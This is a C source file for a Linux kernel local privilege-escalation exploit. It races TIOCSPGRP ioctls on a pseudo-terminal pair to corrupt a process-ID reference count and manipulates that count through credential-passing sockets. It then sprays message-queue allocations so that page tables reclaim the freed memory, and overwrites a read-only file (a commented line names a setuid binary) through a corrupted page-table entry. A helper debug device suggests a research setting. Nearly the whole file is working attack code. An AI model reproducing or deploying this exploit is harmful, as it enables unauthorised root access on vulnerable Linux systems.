#define _GNU_SOURCE
#include <pthread.h>
#include <err.h>
#include <errno.h>
#include <fcntl.h>
#include <linux/ioctl.h>
#include <sched.h>
#include <semaphore.h>
#include <signal.h>
#include <stdbool.h>
#include <stdio.h>
#include <stdlib.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/msg.h>
#include <sys/prctl.h>
#include <sys/resource.h>
#include <sys/socket.h>
#include <sys/un.h>
#include <sys/wait.h>
#include <syscall.h>
#include <unistd.h>

#define TAG "*EXP* "

#define fork() syscall(__NR_clone, CLONE_FILES | CLONE_FS | SIGCHLD, NULL, NULL, NULL, 0)

#define gettid() (int)syscall(__NR_gettid)

#include "exm.h"

#define SYSCHK(x) ({              \
    typeof(x) __res = (x);        \
    if (__res == (typeof(x))-1)   \
        err(1, "SYSCHK(" #x ")"); \
    __res;                        \
})

#define SOCKS_FOR_CREDS 100
#define CREDS_PER_SOCKET 100
#define SKEW_ATTEMPTS 50000

const int total_creds = SOCKS_FOR_CREDS * CREDS_PER_SOCKET;

struct pty_pair {
    int ptmx;
    int tty;
};

struct expmsg_t {
    long type;
    char text[0];
};

struct sockaddr_un unix_addr = {
    .sun_family = AF_UNIX,
    .sun_path = "/tmp/exploitsocket"
};
int listensock;
int cred_socks[SOCKS_FOR_CREDS][2];
struct {
    int ptr;
    sem_t sem;
} *data;
volatile int* syncptr;
int queue;

int exm = -1;

struct {
    pid_t pid;
    unsigned long pid_addr;
} exm_data;

void exm_chk_refcnt()
{
    int refcnt = ioctl(exm, IOC_PID_REFCNT, exm_data.pid_addr);
    printf("[PID] %d refcount = 0x%x (%d)\n", exm_data.pid, refcnt, refcnt);
}

void pin_cpu(int cpu)
{
    cpu_set_t cpuset;
    CPU_ZERO(&cpuset);
    CPU_SET(cpu, &cpuset);
    int r = SYSCHK(sched_setaffinity(0, sizeof(cpuset), &cpuset));
}

void inc_pid(pid_t _pid)
{
    uid_t uid = getuid();
    uid_t gid = getgid();
    pid_t pid = _pid;
    printf("inc_pid will send pid %d uid %d gid %d\n", pid, uid, gid);
    for (int sockidx = 0; sockidx < SOCKS_FOR_CREDS; sockidx++) {
        for (int refs_held = 0; refs_held < CREDS_PER_SOCKET; refs_held++) {
            struct iovec iov = { .iov_base = "a", .iov_len = 1 };
            struct __attribute__((aligned(8))) {
                struct cmsghdr hdr;
                struct ucred ucred;
            } controldata = {
                .hdr = {
                    .cmsg_len = sizeof(struct cmsghdr) + sizeof(struct ucred),
                    .cmsg_level = SOL_SOCKET,
                    .cmsg_type = SCM_CREDENTIALS },
                .ucred = { .pid = pid, .uid = uid, .gid = gid }
            };
            struct msghdr hdr = {
                .msg_iov = &iov,
                .msg_iovlen = 1,
                .msg_control = &controldata,
                .msg_controllen = sizeof(controldata)
            };
            if (sockidx == 0) {
            }
            // printf("send cred %d %d pid %d uid %d gid %d\n", sockidx, refs_held, pid, uid, gid);
            int ret = sendmsg(cred_socks[sockidx][0], &hdr, MSG_DONTWAIT);
            if (ret <= 0) {
                err(1, "sendmsg failed, CREDS_PER_SOCKET is probably too high");
                break;
            }
        }
    }
}

void do_dec_pid(int start, int count)
{
    int sockidx0 = start / CREDS_PER_SOCKET;
    int refs0 = start % CREDS_PER_SOCKET;
    int ctr = 0;
    for (int sockidx = sockidx0; sockidx < SOCKS_FOR_CREDS; sockidx++) {
        for (int refs = refs0; refs < CREDS_PER_SOCKET; refs++) {
            char dummy;
            // printf("reading %d/%d\n", ctr, count);
            if (read(cred_socks[sockidx][1], &dummy, 1) != 1)
                err(1, "read from sockpair_refhold failed with syscall return???");
            ctr++;
            if (ctr == count) {
                return;
            }
        }
        refs0 = 0;
    }
}

void dec_pid(pid_t pid)
{
    int df_status;
    puts("dec_pid");
    *syncptr = 0;
    pid_t df_child = fork();
    if (df_child == -1)
        err(1, "fork");
    if (df_child == 0) {
        for (int sockidx = 0; sockidx < SOCKS_FOR_CREDS; sockidx++) {
            for (int refs = 0; refs < CREDS_PER_SOCKET; refs++) {
                char dummy;
                if (read(cred_socks[sockidx][1], &dummy, 1) != 1)
                    err(1, "read from sockpair_refhold failed with syscall return???");
                (*syncptr)++;
            }
        }
        errx(1, "unexpectedly all socket data was flushed out successfully?");
    }

    if (waitpid(df_child, &df_status, 0) != df_child)
        err(1, "waitpid");
    // if (!WIFSIGNALED(df_status))
    //     errx(1, "double-free child did not die due to signal?");
    printf("double-free child died with signal %d after dropping %d references (%d%%)\n",
        WTERMSIG(df_status), *syncptr,
        100 * (*syncptr) / (SOCKS_FOR_CREDS * CREDS_PER_SOCKET));
    puts("exit dec_pid");
}

sem_t worker_sem;
struct pty_pair pair;
struct worker_args {
    struct pty_pair pair;
};

int worker(void *arg) {
    pid_t parent, child;

    // struct pty_pair pair = args->pair;

    puts("DHILC");
    ioctl(exm, IOC_CRED);
    SYSCHK(prctl(PR_SET_PDEATHSIG, SIGKILL));

    puts("bug child wait");
    sem_wait(&data->sem);
    puts("bug child go");

    pin_cpu(1);


    parent = getpgid(0);
    child = gettid();

    /* create post-death-incrementable pid reference */
    SYSCHK(listen(listensock, 128 /*SOMAXCONN*/));

    // SYSCHK(setpgid(0, 0));

    printf("start inc %d child of %d\n", child, parent);
    inc_pid(child);
    printf("finish inc %d child of %d\n", child, parent);

    for (int attempts = 0; attempts < SKEW_ATTEMPTS; attempts++) {
        while (1) {
            char syncval = *syncptr;
            if ((syncval & 1) == 0) {
                if (syncval == 10)
                    break;
                *syncptr = syncval + 1;
            }
        }
        /* update child -> parent (races, may leave child refcount too low and parent refcount too high) */
        SYSCHK(ioctl(pair.tty, TIOCSPGRP, &parent));
        *syncptr = 11;
    }
    printf("bug child exit\n");
    sem_post(&worker_sem);
    pause();
    return 0;
}

int __clone(int (*func)(void *), void *stack, int flags, void *arg, ...);
int pclone(int (*func)(void *), int flags, void *arg) {
#define STACK_SIZE 0x100000
    void *stack = SYSCHK(mmap(NULL, STACK_SIZE, PROT_READ | PROT_WRITE, MAP_STACK | MAP_ANONYMOUS | MAP_PRIVATE, -1, 0));
    return __clone(func, stack + STACK_SIZE, flags, arg, NULL, 0, NULL);
}



pid_t start_worker(struct pty_pair pair, int do_trigger) {
    pid_t child;
    printf("forking bug child.\n");
    struct worker_args args = {
        .pair = pair
    };
    child = pclone(worker, CLONE_FS | CLONE_FILES | CLONE_THREAD | CLONE_SIGHAND | CLONE_VM, &args);
    if (child < 0) err(1, "clone %d\n", child);

    printf("forked %d from %d\n", child, getpid());

    exm_data.pid_addr = ioctl(exm, IOC_PID_ADDR, child);
    return child;
}

void trigger_bug(struct pty_pair pair, pid_t child, int do_trigger)
{
    puts("start trigger bug");
    pid_t parent = getpid();

    sem_post(&data->sem);

    if (do_trigger) {
        for (int attempts = 0; attempts < SKEW_ATTEMPTS; attempts++) {
            /* update parent -> child (does not race) */
            SYSCHK(ioctl(pair.ptmx, TIOCSPGRP, &child));

            *syncptr = 0;
            while (1) {
                char syncval = *syncptr;
                if ((syncval & 1) == 1) {
                    *syncptr = syncval + 1;
                    /* at 9, we first bump to 10 so that the child can go ahead, then also go ahead ourselves */
                    if (syncval == 9)
                        break;
                }
            }

            /* update child -> parent (races, may leave child refcount too low and parent refcount too high) */
            SYSCHK(ioctl(pair.ptmx, TIOCSPGRP, &parent));

            while (*syncptr != 11) /*wait*/
                ;
        }
    }

    // int status;
    // if (waitpid(child, &status, 0) != child) {
    //     err(1, "wait for bug child");
    // }

    sem_wait(&worker_sem);

    puts("end trigger bug");
}

struct pty_pair setup_tty()
{
    struct pty_pair pair;
    pid_t main_task = SYSCHK(fork());
    if (main_task != 0) {
        int status;
        if (waitpid(main_task, &status, 0) != main_task)
            err(1, "waitpid main_task");
        exit(0);
    }
    SYSCHK(prctl(PR_SET_PDEATHSIG, SIGKILL));
    if (getppid() == 1)
        exit(0);

    printf("executing in first level child process, setting up session and PTY pair...\n");

    /* basic preparation */
    SYSCHK(signal(SIGTTOU, SIG_IGN));
    SYSCHK(setsid());

    /* set up a new pty pair */
    pair.ptmx = SYSCHK(open("/dev/ptmx", O_RDWR));
    unlockpt(pair.ptmx);
    pair.tty = SYSCHK(open(ptsname(pair.ptmx), O_RDWR));
    return pair;
}

void setup_data()
{
    data = mmap(NULL, 0x1000, PROT_READ | PROT_WRITE, MAP_SHARED | MAP_ANONYMOUS, -1, 0);
    syncptr = &data->ptr;
    sem_init(&data->sem, 1, 0);
    sem_init(&worker_sem, 1, 0);
    if ((void*)syncptr == MAP_FAILED)
        err(1, "mmap shared");

    listensock = SYSCHK(socket(AF_UNIX, SOCK_STREAM, 0));
    unlink(unix_addr.sun_path);
    SYSCHK(bind(listensock, (struct sockaddr*)&unix_addr, sizeof(unix_addr)));

    for (int i = 0; i < SOCKS_FOR_CREDS; i++) {
        SYSCHK(socketpair(AF_UNIX, SOCK_STREAM, 0, cred_socks[i]));
    }

    queue = SYSCHK(msgget(IPC_PRIVATE, 0600));
}

int la = 64;
int lb = 30;
int lc = 16;

void prepare_vmas(char* base, const char* real_path)
{

    int real_fd = SYSCHK(open(real_path, O_RDONLY));
    if (mmap((void*)(base + 0x3ffff000), 0x1000, PROT_READ, MAP_SHARED | MAP_FIXED_NOREPLACE, real_fd, 0) == MAP_FAILED)
        err(1, "mmap to materialize L2 table and above");
    *(volatile char*)(base + 0x3ffff000);
    for (int i = 0; i < la * lb; i++) {
        if (mmap((void*)(base + i * lc * 0x1000), 0x1000, PROT_READ, MAP_SHARED | MAP_FIXED_NOREPLACE, real_fd, 0) == MAP_FAILED)
            err(1, "mmap real binary");
    }
}

long alloc_n(long n)
{
    static int total_s;
    int r;
    struct expmsg_t msg = {
        .type = n
    };
    r = msgsnd(queue, (void*)&msg, sizeof(msg.text), 0);
    if (++total_s % 1000 == 0)
        printf("sent %d (%lx)\n", total_s, n);
    if (r == -1) {
        err(1, "snd %lx", n);
    }
    return n;
}

void free_n(long n)
{
    static int total_r;
    int r;
    struct expmsg_t msg;
    r = msgrcv(queue, (void*)&msg, sizeof(msg), n, 0);
    if (r == -1) {
        err(1, "rcv %ld", n);
    }
    // if (++total_r % 20 == 0)
    //     printf("recv %d (%ld)\n", total_r, msg.type);
}

int seq_id = 1;

long fill_one_page()
{
    long si = seq_id++;
    for (int i = 0; i < 63; i++) {
        alloc_n(si);
    }
    return alloc_n(seq_id++);
}

int refsocks[1024];
int lsocks[1024];

pid_t add_to_refcount(int count, int listensock)
{
    *syncptr = 1;
    pid_t child = fork();
    if (child == 0) {
        int isock;

        for (isock = 0; isock < count; isock++) {
            int refsock = SYSCHK(socket(AF_UNIX, SOCK_STREAM, 0));
            SYSCHK(connect(refsock, (struct sockaddr*)&unix_addr, sizeof(unix_addr)));
            int lsock = SYSCHK(accept(listensock, NULL, NULL));
            close(lsock);
            refsocks[isock] = refsock;
            lsocks[isock] = lsock;
        }

        puts("refcount inc done");
        *syncptr = 0;

        puts("refcount drop wait");
        sem_wait(&data->sem);

        puts("refcount drop");

        for (; isock > -1; isock--) {
            close(refsocks[isock]);
        }

        *syncptr = 0;

        puts("refcount drop done");

        exit(0);
    }
    while (*syncptr) ;
    return child;
}

void sub_from_refcount(int count, int listensock)
{
    // for (int i = 0; i < count; i++) {
    //     isock--;
    //     printf("isock %d\n", isock);
    //     if (isock < 0) {
    //         err(1, "sub below 0");
    //     }
    //     close(refsocks[isock]);
    //     close(lsocks[isock]);
    // }
    puts("subbing");
    *syncptr = 1;
    sem_post(&data->sem);
    while (*syncptr) ;
    puts("sub done");
}

int do_write(const char* fake_path, char* base)
{
    int fake_fd = SYSCHK(open(fake_path, O_RDONLY));
    int size = 0x1000;

    printf("write size %u\n", size);
    for (int i = 0; i < la * lb; i++) {
        char* addr = (char*)(base + i * lc * 0x1000);
        if (i % 64 == 0)
            printf("write %p,%p..%p\n", addr, addr + lc * 0x1000, addr + 63 * lc * 0x1000);
        for (int j = 0; j < 2; j++) {
            int res = pread(fake_fd, addr, size, 0);
            if (res == -1) {
                if (errno != EFAULT)
                    perror("read into possibly-corrupted PTE failed");
                continue;
            }
            printf("clobber via corrupted PTE succeeded in page %d, 64-byte-allocation index %d, returned %d\n", i / 64, i % 64, res);
            return 0;
        }
    }
    puts("failed write");
    return -1;
}

int cred_ctr = 0;
void dec_pid_num(int num) {
    pid_t child;
    puts(TAG "start DEC");
    int status;
    child = fork();
    if (child == 0) {
        // pin_cpu(1);
        do_dec_pid(cred_ctr, num);
        exit(0);
    }
    if (waitpid(child, &status, 0) != child)
        err(1, "wait dec child");
    puts(TAG "end DEC");

    cred_ctr += num;

    exm_chk_refcnt();
}

int exploit(const char *real_path, const char *fake_path)
{
    pid_t pid, child;
    setbuf(stdout, NULL);
    sync();

    printf("starting up...\n");

    pin_cpu(0);

    pair = setup_tty();

    setup_data();

    char* base = (char*)0x60000000;
    prepare_vmas(base, real_path);

#define NUM_DRAIN_FDS 40
    long drain_fds[NUM_DRAIN_FDS];
    long seqfiles[1024];
    int i_seq;

    for (int i = 0; i < 50; i++) {
        fill_one_page();
    }

    for (int i = 0; i < NUM_DRAIN_FDS; i++)
        drain_fds[i] = fill_one_page();

    ioctl(exm, IOC_TRACE_MSG, 1);
    for (i_seq = 0; i_seq < 63; i_seq++) {
        seqfiles[i_seq] = alloc_n(seq_id++);
    }

    int do_trigger = 1;

    child = start_worker(pair, do_trigger);

    for (; i_seq < 63 + 64 + 1; i_seq++) {
        seqfiles[i_seq] = alloc_n(seq_id++);
    }
    ioctl(exm, IOC_TRACE_MSG, 0);

    trigger_bug(pair, child, do_trigger);

    puts("refs post bug:");
    exm_chk_refcnt();

    puts(TAG "wait RCU");
    ioctl(exm, IOC_WAIT_RCU, 1);
    sleep(1);
    puts(TAG "Done RCU");

    // puts(TAG "pre add");
    // exm_chk_refcnt();
    // add_to_refcount(0x200, listensock);
    // puts(TAG "post add");
    // exm_chk_refcnt();

    dec_pid_num(total_creds - 0x200);


    puts(TAG "start drain");
    for (int i = 0; i < i_seq; i++) {
        free_n(seqfiles[i]);
    }
    puts(TAG "end drain");
    ioctl(exm, IOC_CHK_PAGE);

    puts("start free");

    for (int i = 0; i < NUM_DRAIN_FDS; i++) {
        free_n(drain_fds[i]);
    }

    puts("free done");
    puts("start pte");

    for (int i = 0; i < la * lb; i++) {
        volatile char* addr = base + i * lc * 0x1000;
        *(volatile char*)addr;
        // ioctl(exm, IOC_PTE, addr);
    }

    puts("pte done");

    puts("refs POST PTE:");
    exm_chk_refcnt();

    // sub_from_refcount(0x200, listensock);
    dec_pid_num(0x200);

    puts("refs after sub:");
    exm_chk_refcnt();

    // pause();
    // exit(0);

    int r = do_write(fake_path, base);

    puts("FINISH");
    // system("sh");

    pause();

    // while (1)
    //     pause();

    return 0;
}



int main()
{
    // insmod();
    exm = open("/dev/exm", O_RDWR);
    if (exm == -1) {
        perror("open /dev/exm");
    }
    // exploit("/sbin/suid", "/sbin/fake");
    SYSCHK(setgid(1000));
    SYSCHK(setuid(1000));
    exploit("/home/owner/data/real", "/home/owner/data/fake");
    return 0;
}